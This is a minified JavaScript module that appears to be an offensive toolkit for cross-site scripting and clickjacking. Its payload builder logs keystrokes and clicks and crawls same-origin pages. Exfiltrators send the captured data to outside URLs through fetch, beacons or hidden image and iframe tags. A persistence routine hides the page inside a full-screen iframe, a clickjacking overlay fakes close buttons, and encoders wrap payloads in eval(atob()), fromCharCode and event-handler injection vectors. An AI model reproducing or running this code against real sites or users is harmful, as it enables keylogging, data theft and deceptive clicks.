var z=Object.defineProperty;var D=(i,e)=>{for(var t in e)z(i,t,{get:e[t],enumerable:!0})};var P={};D(P,{$:()=>B,$$:()=>I,buildUrl:()=>J,createElement:()=>f,createFrame:()=>K,escapeRegExp:()=>j,isCallable:()=>p,loadUglify:()=>H,randInt:()=>S,repr:()=>h,sleep:()=>G});async function H(){if(window.minify)return;let i=t=>new Promise(r=>{let s=document.createElement("script");s.async=!1,s.defer=!0,s.src=t,s.onload=r,document.body.appendChild(s)}),e=["minify.js","utils.js","ast.js","parse.js","transform.js","scope.js","output.js","compress.js","propmangle.js"];return await Promise.all(e.map(t=>i(`https://unpkg.com/uglify-js@3.13.0/lib/${t}`))),window.minify}var B=i=>document.querySelector(i),I=i=>Array.from(document.querySelectorAll(i));function f(i,e=null,t=[]){let r=document.createElement(i);e!==null&&("style"in e&&(Object.assign(r.style,e.style),delete e.style),Object.assign(r,e));for(let s of t)r.appendChild(s);return r}function p(i){return typeof i=="function"||i instanceof u}function h(i){return p(i)?i.toString():Array.isArray(i)&&i.every(e=>p(e))?`[${i.map(e=>e.toString()).join(",")}]`:JSON.stringify(i).replace("/","\\/")}function J(i,e={},t=null){let r=new URLSearchParams(e).toString(),s=i.includes("?")?"&":"?",n=t?"#"+t:"";return i+s+r+n}function j(i){return i.replace(/[.*+?^${}()|[\]\\]/g,"\\$&")}var G=i=>new Promise(e=>window.setTimeout(e,i));function K(i,e=null,t={}){let s=Object.entries({...{"allow-downloads-without-user-activation":!0,"allow-downloads":!0,"allow-forms":!0,"allow-modals":!0,"allow-orientation-lock":!0,"allow-pointer-lock":!0,"allow-popups":!0,"allow-popups-to-escape-sandbox":!0,"allow-presentation":!0,"allow-same-origin":!0,"allow-scripts":!0,"allow-storage-access-by-user-activation":!0,"allow-top-navigation":!0,"allow-top-navigation-by-user-activation":!0},...t}).filter(([n,o])=>o).map(([n,o])=>n).join(" ");return f("iframe",{sandbox:s,name:e,src:i})}function S(i,e){return Math.floor(Math.random()*(e-i)+i)}var v=class{constructor(e=null,t=null){this.parent=e,this.render=t||(r=>r)}static new(){return new v}_bind(e,t){let s=(typeof e=="string"?Function(e):e).toString(),n=t.length?t.map(o=>h(o)).join(",")+",_":"_";return`(await(${s})(${n}))`}_asyncBind(e,t){let s=(typeof e=="string"?Function(e):e).toString(),n=t.length?t.map(o=>h(o)).join(",")+",_":"_";return`((${s})(${n}))`}eval(e,...t){let r=this._bind(e,t);return new v(this,s=>s?`async(_)=>(${s})${r}`:`async(_)=>${r}`)}passthru(e,...t){let r=this._bind(e,t);return new v(this,s=>s?`async(_)=>(${s})([${r},_][1])`:`async(_)=>[${r},_][1]`)}asyncEval(e,...t){let r=this._asyncBind(e,t);return new v(this,s=>s?`async(_)=>(${s})([${r},_][1])`:`async(_)=>[${r},_][1]`)}parallel(...e){return this.eval(async(t,r)=>(await Promise.allSettled(t.map(n=>n(r)))).map(n=>n.status=="fulfilled"?n.value:n.reason),e)}map(e){return this.eval(async(t,r)=>(await Promise.allSettled(r.map(n=>t(n)))).map(n=>n.status=="fulfilled"?n.value:n.reason),e)}forEach(e){return this.passthru(async(t,r)=>{let s=await Promise.allSettled(r.map(n=>t(n)));return s.map(n=>n.status=="fulfilled"?n.value:n.reason),s.map(n=>n.status=="fulfilled"?n.value:n.reason)},e)}guard(){let e=Math.floor(Math.random()*1e6).toString(16);return this.passthru(t=>{if(window.__guard==t)throw Error("Guard");window.__guard=t},e)}setExfiltrator(e){return this.passthru(t=>this.__exfiltrator=[t],e)}addExfiltrator(e){return this.passthru(t=>this.__exfiltrator=this.__exfiltrator?this.__exfiltrator.concat(t):[t],e)}exfiltrate(e=null){return e!=null?this.passthru(t=>(this.__exfiltrator||[]).forEach(r=>r(t)),e):this.passthru(t=>(this.__exfiltrator||[]).forEach(r=>r(t)))}wait(e=null){return p(e)?this.passthru(async(t,r)=>{let s=await t(r);return new Promise(n=>window.setTimeout(n,s))},e):(e===null&&this.passthru(t=>new Promise(r=>window.setTimeout(r,t))),this.passthru(t=>new Promise(r=>window.setTimeout(r,t)),e))}fetch(e,t={}){return p(e)?this.eval(async(r,s)=>{let n=await r(s);return Array.isArray(n)?fetch(...n):fetch(n)},e):e!==void 0?this.eval((r,s)=>fetch(r,s),e,t):this.eval(r=>Array.isArray(r)?fetch(...r):fetch(r))}fetchText(e,t={}){return this.fetch(e,t).eval(r=>r.text())}fetchDOM(e,t={}){return this.fetchText(e,t).asDOM()}fetchJSON(e,t={}){return this.fetch(e,t).eval(r=>r.json())}asDOM(e="text/html"){return this.eval((t,r)=>new DOMParser().parseFromString(r,t),e)}querySelector(e,t=null){if(p(e))return this.eval(async(s,n)=>{let o=await s(n);if(Array.isArray(o)){let a=n.querySelector(o[0]);return o.length>1?a[o[1]]:a}else return n.querySelector(o)},e);let r=this.eval((s,n)=>n.querySelector(s),e);return t===null?r:r.eval((s,n)=>n[s],t)}querySelectorAll(e,t=null){if(p(e))return this.eval(async(s,n)=>{let o=await s(n);if(Array.isArray(o)){let a=Array.from(n.querySelectorAll(o[0]));return o.length>1?a.map(l=>l[o[1]]):a}else return Array.from(n.querySelectorAll(o))},e);let r=this.eval((s,n)=>Array.from(n.querySelectorAll(s)),e);return t===null?r:r.eval((s,n)=>n.map(o=>o[s]),t)}regExtract(e,t=""){return p(e)?this.eval(async(r,s)=>{let n=await r(s),[o,a]=Array.isArray(n)?n:[n,""],l=new RegExp(o,a).exec(s);return l?l[1]:null},e):this.eval((r,s,n)=>{let o=new RegExp(r,s).exec(n);return o?o[1]:null},e,t)}findBetween(e,t){return p(e)?this.eval(async(r,s,n)=>{let[o,a]=await s(n),l=new RegExp(`${r(o)}(.*?)${r(a)}`,"ms").exec(n);return l?l[1]:null},j,e):this.regExtract(`${j(e)}(.*?)${j(t)}`,"ms")}startKeyLogger(e=null){let t=({key:r})=>{this.__exfiltrator.forEach(s=>s({key:r}))};return this.passthru(r=>window.addEventListener("keydown",this.__keyLogger=r),e||t)}startClickLogger(e=null){let t=({buttons:r,clientX:s,clientY:n,target:{outerHTML:o}})=>{this.__exfiltrator.forEach(a=>a({buttons:r,x:s,y:n,target:o}))};return this.passthru(r=>{window.addEventListener("click",this.__clickLogger=r)},e||t)}injectStyle(e=null){return p(e)?this.passthru(async(t,r)=>{let s=document.createElement("style");s.innerText=await t(r),document.body.appendChild(s)},e):e!==null?this.passthru(t=>{let r=document.createElement("style");r.innerText=t,document.body.appendChild(r)},e):this.passthru(t=>{let r=document.createElement("style");r.innerText=t,document.body.appendChild(r)})}postMultipart(e,t,r={}){return p(e)?this.eval((s,n)=>{let[o,a,l]=s(n),c=new FormData;for(let[g,y]of Object.entries(a))c.append(g,y);return fetch(o,{...l,method:"POST",body:c})},e):this.eval((s,n,o)=>{let a=new FormData;for(let[l,c]of Object.entries(o))a.append(l,c);return fetch(s,{...n,method:"POST",body:a})},e,t,r)}postUrlEncoded(e,t,r={}){return p(e)?this.eval((s,n)=>{let[o,a,l]=s(n),c=new URLSearchParams;for(let[g,y]of Object.entries(a))c.append(g,y);return fetch(o,{...l,method:"POST",body:c})},e):this.eval((s,n,o)=>{let a=new URLSearchParams;for(let[l,c]of Object.entries(n))a.append(l,c);return fetch(s,{...o,method:"POST",body:a})},e,t,r)}persist(e=null){return this.passthru(t=>{let r=document.createElement("iframe");Object.assign(r.style,{display:"block",position:"absolute",top:"0px",let:"0px",width:"100vw",height:"100vh",border:"none"}),r.addEventListener("load",s=>{window.history.replaceState({},"",r.contentWindow.location.href),r.contentWindow.addEventListener("click",this.__clickLogger),r.contentWindow.addEventListener("keydown",this.__keyLogger),r.contentWindow.addEventListener("unload",()=>{let n=r.contentDocument.activeElement;setTimeout(()=>{try{""+r.contentWindow.location.href}catch{location.href=n.href}},0)}),t(r.contentWindow.document)}),r.src="/",document.documentElement.innerHTML="",document.documentElement.appendChild(r)},e||(t=>t))}spider(e,t=1,r=null){return this.eval(async(s,n,o)=>{let a=new Map,l=g=>{let y=new DOMParser().parseFromString(g,"text/html");return Array.from(y.querySelectorAll("a")).map(k=>k.href).filter(k=>!a.has(k))},c=async(g,y)=>{let x=await fetch(g,{mode:"same-origin",cache:"only-if-cached"}).then(E=>E.text()).catch(()=>null);if(a.set(g,x),o(g,x),x===null)return;let k=l(x);if(y!=0)return await Promise.all(k.map(E=>c(E,y-1)))};return await c(Object.assign(document.createElement("a"),{href:s}).href,n),Array.from(a.entries())},e,t,r||(s=>s))}postMessage(e="top",t="*"){return this.passthru((r,s,n)=>window.frames[r].postMessage(n,s),e,t)}log(){return this.passthru(e=>console.log(e))}redirect(e){return this.passthru(t=>window.location=t,e)}compile(e=null){return this.parent?this.parent.compile(this.render(e)):this.render(e||"_=>_")}toString(){return this.compile()||""}bindRun(e=null,...t){return`(function(){return (${this.compile()})(${t.join(",")})}).bind(${e})()`}run(){return this.bindRun("{}","window.document")}},u=v;function $(i,e){return i+(i.includes("?")?"&":"?")+e+"="}var A=class{static get(e,t="data"){let r=$(e,t);return u.new().eval((s,n)=>fetch(s+btoa(JSON.stringify(n)),{mode:"no-cors",cache:"no-cache"}),r)}static post(e,t="data"){return u.new((r,s,n)=>fetch(r,{mode:"no-cors",method:"POST",body:{[s]:JSON.stringify(n)}}),e,t)}static postJSON(e){return u.new().eval((t,r)=>fetch(t,{mode:"no-cors",method:"POST",body:JSON.stringify(r)}),e)}static sendBeacon(e){return u.new().eval((t,r)=>navigator.sendBeacon(t,JSON.stringify(r)),e)}static console(e=null){return e!==null?u.new().eval((t,r)=>console.log(t,r),e):u.new().log()}static img(e,t="data"){let r=$(e,t);return u.new().eval((s,n)=>{let o=document.createElement("img");o.src=s+btoa(JSON.stringify(n)),o.hidden=!0,document.body.appendChild(o)},r)}static style(e,t="data"){let r=$(e,t);return u.new().eval((s,n)=>{let o=document.createElement("style");o.src=s+btoa(JSON.stringify(n)),o.hidden=!0,document.body.appendChild(o)},r)}static iframe(e,t="data"){let r=$(e,t);return u.new().eval((s,n)=>{let o=document.createElement("iframe");o.src=s+btoa(JSON.stringify(n)),o.hidden=!0,document.body.appendChild(o)},r)}static message(e="top",t="*"){return u.new().eval((r,s,n)=>window.frames[r].postMessage(JSON.stringify(n),s),e,t)}},M=A;var _=class{constructor(){this.onmessage=[],this.listener=null,this.log=typeof window.log=="function"?window.log:null}_handleMessage(e){this.log?this.log(`[MSG][${e.origin}]: `,e.data):console.log(`[MSG][${e.origin}]: `,e.data),this.onmessage.forEach(t=>{t(e.data,e.origin)})}waitForMessage(e=()=>!0){return new Promise(t=>{let r=(s,n)=>{e(s,n)&&(t(s),this.removeListener(r))};this.addListener(r)})}listen(){return this.listener=window.addEventListener("message",e=>this._handleMessage(e)),this}stop(){return window.removeEventListener("message",this.listener),this}logMessages(e){return this.log=e,this}addListener(e){return this.onmessage.push(e),this}removeListener(e){return this.onmessage=this.onmessage.filter(t=>t!=e),this}},T=_;var X=`

.clickjacker * {
    margin: 0;
    padding: 0;
  }

  .clickjacker {
    --c-x: calc(var(--x) + var(--w) / 2);
    --c-y: calc(var(--y) + var(--h) / 2);
    --size: 25px;
    --bg-color: white;
    background: rgba(0, 0, 0, 0.5);
    position: fixed;
    top: 0;
    left: 0;
    height: 100vh;
    width: 100vw;
    display: flex;
    align-items: center;
    justify-content: center;
  }

  .clickjacker .inner {
    position: relative;
  }

  .clickjacker .fake-container {
    border: 2px solid black;
  }

  .clickjacker .inner .close {
    position: absolute;
    top: 0;
    right: 0;
    transform: translate(40%, -40%);
  }
  .clickjacker .inner > div:hover .frame-container::after {
    font-weight: bold;
  }
  .clickjacker .frame-container {
    box-sizing: border-box;
    position: relative;
    width: var(--size);
    height: var(--size);
    overflow: hidden;
    border-radius: 100%;
    border: 2px solid black;
  }
  .clickjacker:not(.debug) .frame-container::after {
    box-sizing: border-box;
    content: "\xD7";
    position: absolute;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    display: flex;
    justify-content: center;
    align-items: center;
    background: white;
    pointer-events: none;
    color: black;
  }

  .clickjacker .frame-container iframe {
    position: absolute;
    border: none;
    width: 100vw;
    height: 1000vh;
    top: calc(var(--c-y) * -1px + var(--size) / 2);
    left: calc(var(--c-x) * -1px + var(--size) / 2);
  }
`;function Y(){let i=S(400,600),e=S(400,600),t=S(0,4095),r=("000"+t.toString(16)).slice(-3);return f("div",{innerText:"Close me.",style:{width:`${i}px`,height:`${e}px`,background:`#${r}`,color:"white",display:"flex",alignItems:"center",justifyContent:"center",fontSize:"2em"}})}function Q(i,e=!1){let t=f("iframe",{src:i}),r=f("div",{className:"fake-container"}),s=f("input",{style:{position:"fixed",top:"-1000px"}}),n=f("div",{className:`clickjacker${e?" debug":""}`},[f("div",{className:"inner"},[f("div",{className:"close"},[f("div",{className:"frame-container"},[t])]),r,s])]);return{el:n,frame:t,setFake:c=>{r.innerHTML="",r.appendChild(c)},setPos:c=>{n.style.setProperty("--x",c.x),n.style.setProperty("--y",c.y),n.style.setProperty("--w",c.width||0),n.style.setProperty("--h",c.height||0)},setFocus:()=>s.focus()}}function V(i){return new Promise(e=>{let t=()=>{setTimeout(async()=>{document.activeElement==i&&(window.removeEventListener("blur",t),e())},200)};window.addEventListener("blur",t)})}var U=class{constructor(e,t=!1){this.debug=t,this.url=e,this.steps=[]}_init(){return new Promise(e=>{let t="ClickJackerCSS";if(document.getElementById(t))return e();let r=document.createElement("style");r.id=t,r.innerText=X,r.onload=()=>e(),(document.header||document.documentElement).appendChild(r)})}addStep(e,t=null,r=200){return this.steps.push({box:e,content:t,wait:r}),this}async run(){await this._init();let e=Q(this.url,this.debug);document.body.appendChild(e.el),e.setFocus();for(let t of this.steps)e.setFake(t.content?t.content:Y()),e.setPos(t.box),await V(e.frame),e.setFocus();return e.el.style.left="1000vw",this}},F=U;function Z(i){return document.createElement(i).outerHTML.match(/</g).length==1}function C(i,e="",t=""){return`data:${e};${t},${encodeURIComponent(i)}`}function N(i,e=""){return C(btoa(i),e,"base64")}function W(i){return`javascript:${encodeURIComponent(i)}`}function w(i,e){let r=`_${Math.floor(Math.random()*1e17).toString(16)}_`,s=document.createElement(r);for(let[o,a]of Object.entries(e))s.setAttribute(o,a);let n=s.outerHTML;return Z(i)&&(n=n.slice(0,-(r.length+4))+"/>"),n.replace(new RegExp(r,"g"),i)}var b=class{constructor(e=null,t=null){this.parent=e,this.wrapper=t}static new(){return new m}wrap(e){let t=e instanceof u?e.run():e.toString();return this._compile(t)}_compile(e){let t=this.parent?this.parent._compile(e):e;return this.wrapper?this.wrapper(t):t}},m=class extends b{templateString(){return new m(this,e=>`Function\`_\${atob\`${btoa(e)}\`}\`\`\``)}evalB64(){return new m(this,e=>`eval(atob(${h(btoa(e))}))`)}evalStringForCharCode(){return new m(this,e=>`eval(String.fromCharCode(${Array.from(e).map(t=>t.charCodeAt(0)).join(",")}))`)}url(){return new R(this,e=>W(e))}dataUrl64(){return new L(this,e=>N(e,"application/javascript"))}dataUrl(){return new L(this,e=>C(e,"application/javascript"))}script(){return new d(this,e=>`<script>${e.replace(/<\/script>/g,"<\\/script>")}</script>`)}appendScript(e="body"){return new m(this,t=>`document.querySelector(${h(e)}).appendChild(Object.assign(document.createElement("script"), {innerHTML: ${h(t)}}))`)}event(e,t){return new d(this,r=>w(e,{[t]:r}))}svgLoad(){return new d(this,e=>w("svg",{onload:e}))}imgError(){return new d(this,e=>w("img",{src:"x:",alt:"",onerror:e}))}inputFocus(){return new d(this,e=>w("input",{autofocus:"true",onfocus:e}))}minify(){if(!window.minify)throw Error("uglify-js is not available, use utils.loadUglify() before calling this function.");return new m(this,e=>window.minify(e).code)}prepend(e){return new m(this,t=>`${e}${t}`)}append(e){return new m(this,t=>`${t}${e}`)}enclose(e,t){return this.prepend(e).append(t)}},R=class extends b{iframe(){return new d(this,e=>w("iframe",{src:e}))}object(){return new d(this,e=>w("object",{data:e}))}embed(){return new d(this,e=>w("embed",{data:e}))}redirect(){return new m(this,e=>`window.location=${h(e)}`)}},L=class extends b{script(){return new d(this,e=>w("script",{src:e}))}scriptImport(){return new d(this,e=>`<script>import(${h(e)})</script>`)}},O=class extends b{iframe(){return new d(this,e=>w("iframe",{src:e}))}windowOpen(){return new m(this,e=>`window.open(${h(e)})`)}},d=class extends b{iframe(){return new d(this,e=>w("iframe",{srcdoc:e}))}write(){return new m(this,e=>`document.write(${h(e)})`)}innerHTML(e="body"){return new m(this,t=>`document.querySelector(${h(e)}).innerHTML = ${h(t)}`)}dataUrl64(){return new O(this,e=>N(e,"text/html"))}dataUrl(){return new O(this,e=>C(e,"text/html"))}prepend(e){return new d(this,t=>`${e}${t}`)}append(e){return new d(this,t=>`${t}${e}`)}enclose(e,t){return this.prepend(e).append(t)}},q=b;export{F as ClickJacker,M as Exfiltrators,T as MessageHandler,u as Payload,q as Wrapper,P as utils};
